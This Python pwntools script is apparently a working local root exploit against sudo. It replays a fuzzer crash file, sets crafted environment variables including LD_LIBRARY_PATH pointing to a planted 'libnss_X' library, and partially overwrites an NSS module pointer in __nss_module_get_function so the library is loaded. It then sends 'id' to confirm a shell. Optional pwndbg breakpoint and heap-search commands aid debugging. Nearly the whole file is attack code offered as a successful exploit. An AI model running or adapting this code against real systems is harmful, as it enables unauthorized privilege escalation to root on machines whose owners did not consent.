import json
import sys
import re
import os
import random
import string
from pwn import *

RUN_IN_GDB=False
if len(sys.argv) >=2:
    FNAME = sys.argv[1]
else:
    FNAME='inp.553068' # successful exploit

def find_arg(cmd: list[str], arg: list[str]) -> int:
    # Note that this performs a loose search.
    # e.g. Searching for 'AAA' in ['hellAAAo', 'world', 'AAA']
    # will match and return position 0, i.e. 'hellAAAo'
    for i in range(len(cmd)):
        if len(cmd[i:]) < len(arg):
            return -1
        
        found=True
        for j in range(len(arg)):
            if arg[j] not in cmd[i+j]:
                found = False
                break
        if found:
            return i
    return -1

def remove_arg(cmd: list[str], arg: list[str]):
    arg_pos = find_arg(cmd, arg)
    if arg_pos == -1:
        return False
    for _ in range(len(arg)):
        cmd.pop(arg_pos)
    return True


def add_gdb_arg(cmd: list[str], arg: list[str]):
    gdb_argpos = find_arg(cmd, ['gdb'])
    assert(gdb_argpos != -1)
    for i in reversed(range(len(arg))):
        cmd.insert(gdb_argpos+1, arg[i])
        
def remove_gdb(cmd: list[str]):
    # Strip gdb from the command

    pos = find_arg(cmd, ['--args'])
    exec_wrapper_pos = find_arg(cmd, ['set exec-wrapper'])
    if exec_wrapper_pos != -1:
        binary = cmd[exec_wrapper_pos].split()[-1]
        cmd.pop(pos+1)
    else:
        binary = cmd[pos-1]

    for _ in range(pos+1):
        cmd.pop(0)
    cmd.insert(0, binary)

def ad_hoc_modify(cmd: list[str], env: dict):
    if FNAME == 'inp.553068':
        # These are the same as the original values. Just prettier for easier manipulation
        env['TZ']              = 'N'*198
        env['GCONV_PATH']      = 'Q'*35
        env['Y'*3470]          = '0'*48
        env['c'*13]            = '1'
        
        # Required to load our library
        env['LD_LIBRARY_PATH'] = 'libnss_X/'
        
        # g = cyclic_gen()        
        # for i in range(4):
        #     cmd[-i-1] = g.get(len(cmd[-i-1])).decode()
        
        def debug_crashing_point():
            if not RUN_IN_GDB:
                return
            argv_start = find_arg(cmd, ['--args'])+1
            cmd.pop(argv_start+4)
            cmd.pop(argv_start+4)
            
        def partial_overwrite():
            # Partial overwrite of `module` argument in `__nss_module_get_function`
            # The new pointer must satisfy all the below conditions:
            #   1. p->state = 0 (nss_module_uninitialized)
            #   2. p->name is a valid pointer that points to an empty string ""
            cmd.pop()
            cmd.pop()
            cmd.append('BB' + '\x01') # overwrite 2 least significant bytes. 1 of them is always NULL.
            # cmd.append('BB' + chr(int(sys.argv[2]))) # overwrite 2 least significant bytes. 1 of them is always NULL.
            
        # Choose action:
        partial_overwrite()
        # debug_crashing_point()

def ad_hoc_communicate(io):
    if FNAME == 'inp.553068':
        if not RUN_IN_GDB:
            io.sendline(b'id') # test if we succeed
        else:
            io.sendline(b'start')

            # Insert breakpoint at the time point and location where we control the `module` pointer
            io.sendline(b'b __nss_module_get_function if (int)strncmp($rsi, "initgroups_dyn", 14) == 0')
            io.sendline(b'command $bpnum')
            io.sendline(b'  bt')
            io.sendline(b'  p module')
            io.sendline(b'  tbreak __libc_dlopen_mode')
            io.sendline(b'end')

            io.sendline(b'define searcher')
            io.sendline(b'  search -t bytes AAAAAAAA [heap]')
            io.sendline(b'  search -t bytes BBB [heap]')
            io.sendline(b'  search -t bytes NNNNNNNN [heap]')
            io.sendline(b'  search -t bytes QQQQQQQQ [heap]')
            io.sendline(b'  search -t bytes YYYYYYYY [heap]')
            io.sendline(b'end')
            
            # pwndbg> $ p module
            # $2 = (struct nss_module *) 0x555555588900
            # pwndbg> $ moduler 0x555555588900 0
            # $52 = (struct nss_module *) 0x555555588900
            # $53 = -137633728
            # $54 = 0x555555588b18 "1"
            # pwndbg> $ moduler 0x555555588900 0 
            io.sendline(b'define moduler')
            io.sendline(b'  set $x=(struct nss_module*)((uint64_t)($arg0)+(uint64_t)($arg1))')
            io.sendline(b'  p $x')
            io.sendline(b'  p $x->state')
            io.sendline(b'  p $x->name')
            io.sendline(b'end')

            io.sendline(b'c')
    

print(f"Using fname: {FNAME}")
with open('results-crashes/' + FNAME) as f:
    crash = json.load(f)

cmd: list[str] = crash['input']['gdbcmd']
process_env: dict = crash['output']['env']

# replcae PWNLIB_NOTERM since now we will run in a terminal
if 'PWNLIB_NOTERM' in process_env.keys():
    process_env[len('PWNLIB_NOTERM')*'c']=process_env['PWNLIB_NOTERM']
    del process_env['PWNLIB_NOTERM']

# TODO: Check LC_* stuff
remove_arg(cmd, ['--nh']) # we will use pwndbg

remove_arg(cmd, ['-x', 'gdbscript.py'])
remove_arg(cmd, ['-iex', 'set context-output'])
remove_arg(cmd, ['-iex', 'set disable-colors'])

add_gdb_arg(cmd, ['-iex', 'add-symbol-file /usr/local/libexec/sudo/libsudo_util.so.0'])
add_gdb_arg(cmd, ['-iex', 'add-symbol-file /usr/local/libexec/sudo/sudoers.so'])

ad_hoc_modify(cmd, process_env)

if not RUN_IN_GDB:
    remove_gdb(cmd)

print(cmd)
print("Environment:")
for k,v in process_env.items():
    print(f' [*] {k}={v}')

# os.execvpe(cmd[0], cmd) # results in broken terminal
io = process(cmd, stdin=PTY, env=process_env)
ad_hoc_communicate(io)
io.interactive() # hit 'start' or 'run' in the debugger when ready
# print(io.recvall(0.5).decode())
io.close()
